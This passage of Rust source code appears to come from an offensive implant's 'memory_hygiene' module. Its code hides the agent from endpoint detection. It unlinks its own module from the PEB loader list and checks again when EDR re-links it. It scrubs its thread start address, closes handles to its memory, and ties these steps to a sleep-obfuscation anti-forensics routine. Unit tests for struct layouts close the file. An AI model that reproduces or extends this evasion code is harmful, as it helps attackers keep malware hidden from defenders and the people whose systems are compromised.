    // is a section mapping our image.
    sbi[0] as usize == allocation_base && allocation_base != 0
}

// ── Periodic hygiene ─────────────────────────────────────────────────────────

/// Configuration for periodic hygiene checks.
#[derive(Clone, Debug)]
pub struct HygieneConfig {
    /// Interval in seconds between hygiene runs (default: 60).
    pub interval_secs: u64,
    /// Re-scrub PEB traces if they've been restored.
    pub scrub_peb: bool,
    /// Re-scrub thread start address if it's been restored.
    pub scrub_thread_start: bool,
    /// Re-scrub handle table.
    pub scrub_handles: bool,
}

impl Default for HygieneConfig {
    fn default() -> Self {
        Self {
            interval_secs: DEFAULT_HYGIENE_INTERVAL_SECS,
            scrub_peb: true,
            scrub_thread_start: true,
            scrub_handles: true,
        }
    }
}

/// Set the hygiene interval (in seconds).  0 means "use default".
pub fn set_hygiene_interval(secs: u64) {
    if secs == 0 {
        HYGIENE_INTERVAL_SECS.store(DEFAULT_HYGIENE_INTERVAL_SECS, Ordering::Relaxed);
    } else {
        HYGIENE_INTERVAL_SECS.store(secs, Ordering::Relaxed);
    }
}

/// Perform periodic hygiene checks.
///
/// Called from the agent's main loop every N iterations.  This function:
///
/// 1. Checks if enough time has elapsed since the last hygiene run.
/// 2. Re-verifies PEB unlinks haven't been restored (some EDR re-links modules).
/// 3. Re-verifies thread start addresses are still scrubbed.
/// 4. Checks that no new handles to the agent's memory have been opened.
/// 5. If any check fails, re-applies the scrubbing and logs a warning.
///
/// Returns `true` if any scrubbing was re-applied.
pub unsafe fn periodic_hygiene(config: &HygieneConfig) -> bool {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let interval = HYGIENE_INTERVAL_SECS.load(Ordering::Relaxed);
    let last = LAST_HYGIENE_RUN.load(Ordering::Relaxed);

    if last != 0 && now.saturating_sub(last) < interval {
        return false; // Not enough time has elapsed.
    }

    let mut re_applied = false;

    // ── 1. Verify PEB unlinks ─────────────────────────────────────────────
    if config.scrub_peb && !verify_peb_unlinks() {
        log::warn!("[memory_hygiene] PEB links were restored — re-scrubbing");
        scrub_peb_traces();
        re_applied = true;
    }

    // ── 2. Verify thread start address ────────────────────────────────────
    if config.scrub_thread_start && !verify_thread_start_address() {
        log::warn!("[memory_hygiene] thread start address was restored — re-scrubbing");
        scrub_thread_start_address();
        re_applied = true;
    }

    // ── 3. Verify handle table ────────────────────────────────────────────
    if config.scrub_handles {
        scrub_handle_table();
        // Handle scrubbing is always "re-applied" in the sense that it
        // actively closes handles each run.
    }

    LAST_HYGIENE_RUN.store(now, Ordering::Relaxed);

    re_applied
}

/// Verify that the agent's module is still unlinked from the PEB.
///
/// Returns `true` if the module is still unlinked (good), `false` if it
/// appears to have been re-linked (EDR might do this).
unsafe fn verify_peb_unlinks() -> bool {
    let image_base = get_image_base();
    if image_base == 0 {
        return true; // Can't verify, assume OK.
    }

    let ldr = get_ldr();
    if ldr.is_null() {
        return true;
    }

    // Walk InMemoryOrderModuleList and check if our module is present.
    let list_head = (ldr as usize + 0x20) as *const usize;
    let mut current = *list_head;

    for _ in 0..512 {
        if current == 0 || current as usize == list_head as usize {
            break;
        }
        let entry = (current as usize) - ENTRY_FROM_MEM_LINKS;
        let dll_base = *(entry as *const usize).add(OFF_DLL_BASE / 8);

        // If DllBase matches our image_base AND the DllBase field is non-zero,
        // it means the entry was re-linked (DllBase was zeroed during scrub).
        // But if an EDR restored DllBase, the entry would be back.
        // We check if the entry is still in the list (i.e. not unlinked).
        if dll_base == image_base {
            // Our module is present in the list — it was re-linked.
            return false;
        }

        current = *(current as *const usize);
    }

    // Module not found in the list — still unlinked.  Good.
    true
}

/// Verify that the thread start address is still scrubbed.
///
/// Returns `true` if the start address is clean, `false` if it points to
/// agent code again.
unsafe fn verify_thread_start_address() -> bool {
    let image_base = get_image_base();
    if image_base == 0 {
        return true;
    }

    let image_size = {
        let peb = get_peb();
        if peb.is_null() {
            0
        } else {
            find_own_image_size(peb, image_base).unwrap_or(0)
        }
    };
    let image_end = image_base + image_size;

    let thread_handle = current_thread_handle();
    let mut start_addr: usize = 0;
    let mut ret_len: u32 = 0;

    let status = nt_query_information_thread(
        thread_handle,
        THREAD_QUERY_SET_WIN32_START_ADDRESS,
        &mut start_addr as *mut usize as *mut u8,
        std::mem::size_of::<usize>() as u32,
        &mut ret_len,
    );

    if let Some(s) = status {
        if s >= 0 && start_addr >= image_base && start_addr < image_end {
            return false; // Start address still points to agent code.
        }
    }

    true
}

/// Run all hygiene functions immediately (used during `secure_sleep` anti-forensics).
///
/// This is the integration point called from `sleep_obfuscation::secure_sleep`.
pub unsafe fn run_all_hygiene() {
    scrub_peb_traces();
    scrub_thread_start_address();
    scrub_handle_table();
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hygiene_config_default_values() {
        let cfg = HygieneConfig::default();
        assert_eq!(cfg.interval_secs, 60);
        assert!(cfg.scrub_peb);
        assert!(cfg.scrub_thread_start);
        assert!(cfg.scrub_handles);
    }

    #[test]
    fn set_hygiene_interval_zero_uses_default() {
        set_hygiene_interval(0);
        assert_eq!(
            HYGIENE_INTERVAL_SECS.load(Ordering::Relaxed),
            DEFAULT_HYGIENE_INTERVAL_SECS
        );
    }

    #[test]
    fn set_hygiene_interval_custom() {
        set_hygiene_interval(120);
        assert_eq!(HYGIENE_INTERVAL_SECS.load(Ordering::Relaxed), 120);
        // Reset.
        set_hygiene_interval(DEFAULT_HYGIENE_INTERVAL_SECS);
    }

    #[test]
    fn saved_peb_links_default_not_saved() {
        let links = SavedPebLinks::default();
        assert!(!links.saved);
        assert_eq!(links.dll_base, 0);
        assert_eq!(links.entry_point, 0);
        assert_eq!(links.size_of_image, 0);
    }

    #[test]
    fn unicode_string_struct_layout() {
        // Verify UNICODE_STRING layout assumptions.
        assert_eq!(std::mem::size_of::<UnicodeString>(), 16); // 2+2+4pad+8 on x64.
        assert_eq!(std::mem::offset_of!(UnicodeString, length), 0);
        assert_eq!(std::mem::offset_of!(UnicodeString, maximum_length), 2);
        assert_eq!(std::mem::offset_of!(UnicodeString, buffer), 8);
    }

    #[test]
    fn list_entry_size() {
        assert_eq!(std::mem::size_of::<ListEntry>(), 16);
    }

    #[test]
    fn offset_constants_are_aligned() {
        // DllBase, EntryPoint should be 8-byte aligned.
        assert_eq!(OFF_DLL_BASE % 8, 0);
        assert_eq!(OFF_ENTRY_POINT % 8, 0);
        // FullDllName, BaseDllName should be 8-byte aligned.
        assert_eq!(OFF_FULL_DLL_NAME % 8, 0);
        assert_eq!(OFF_BASE_DLL_NAME % 8, 0);
    }

    #[test]
    fn thread_local_saved_links_initially_default() {
        SAVED_PEB_LINKS.with(|sl| {
            let links = sl.borrow();
            assert!(!links.saved);
        });
    }

    #[test]
    fn current_process_handle_is_minus_one() {
        assert_eq!(current_process_handle(), (-1isize) as usize);
    }

    #[test]
    fn current_thread_handle_is_minus_two() {
        assert_eq!(current_thread_handle(), (-2isize) as usize);
    }
}
